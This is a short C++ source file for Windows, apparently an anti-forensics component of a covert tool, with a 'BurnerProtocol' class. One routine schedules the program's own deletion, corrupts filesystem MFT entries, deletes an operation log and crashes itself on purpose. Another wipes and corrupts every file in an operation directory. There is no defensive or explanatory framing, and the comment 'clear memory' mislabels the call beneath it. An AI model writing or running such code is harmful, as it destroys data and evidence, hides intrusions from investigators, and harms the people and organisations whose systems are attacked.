#include <Windows.h>
#include <iostream>
#include <filesystem>
#include "AntiForensics.h"

namespace fs = std::filesystem;

void BurnerProtocol::SelfDestruct() {
    WCHAR modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
    
    MoveFileExW(modulePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_REPLACE_EXISTING);
    
    AntiForensics::CorruptMftEntry(modulePath);
    
    fs::remove("C:\\logs\\operation.log");
    
    __ud2();
}

void BurnerProtocol::EmergencyWipe() {
    // wipe all related files
    for (const auto& entry : fs::directory_iterator("C:\\temp\\operation")) {
        AntiForensics::CorruptMftEntry(entry.path().c_str());
        fs::remove(entry.path());
    }
    
    // clear memory
    BurnerProtocol::SelfDestruct();
}
